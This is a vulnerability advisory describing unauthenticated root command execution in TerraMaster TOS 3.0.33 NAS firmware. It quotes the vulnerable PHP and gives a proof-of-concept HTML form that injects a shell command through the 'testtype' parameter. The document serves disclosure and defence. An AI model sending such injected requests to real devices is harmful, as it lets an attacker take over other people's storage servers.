**Vulnerability Summary**<br>
The following advisory describes a unauthenticated remote command execution found in TerraMaster TOS 3.0.33.
TOS is a “Linux platform-based operating system developed for TerraMaster cloud storage NAS server. TOS 3 is the third generation operating system newly launched.”

**Credit**<br>
An independent security researcher has reported this vulnerability to Beyond Security’s SecuriTeam Secure Disclosure program.

**Vendor response**<br>
The vendor stated that version 3.1.03 of TerraMaster TOS is no longer vulnerable to this vulnerability, the latest version of the software can be obtained from: http://download.terra-master.com/download.php.

**Vulnerability details**<br>
User controlled input is not sufficiently filtered and unauthenticated user can execute commands as root by sending a POST request to http://IP/include/ajax/GetTest.php with the following parameters:

* dev=1
* testtype=;COMMAND-TO-RUN;
* submit=Send

We can see in the source code that the value of parameter testtype will assign to $line and will execute by shell_exec()

```php
$file = "/mnt/base/.".basename($data['dev'])."test";
if(!file_exists($file)) touch($file);
if(isset($data['testtype'])){//开始或者停止过程...
if($data['testtype'] != 'stop'){
$line = $data['dev'].':'.$data['testtype'].":".time();
shell_exec("echo -e \"".$line."\" > $file");
}
$return = smartscan($data['dev'],$data['testtype']);
}else{//得到状态过程...
$return = smartscan($data['dev']);
}
```

**Proof of Concept**<br>
```html
<form method="post" action="http://IP/include/ajax/GetTest.php">
<input type="text" name="dev" value="1">
<input type="text" name="testtype" value='"; sleep 5; echo " '>
<input type="submit" value='Send'>
</form>
```
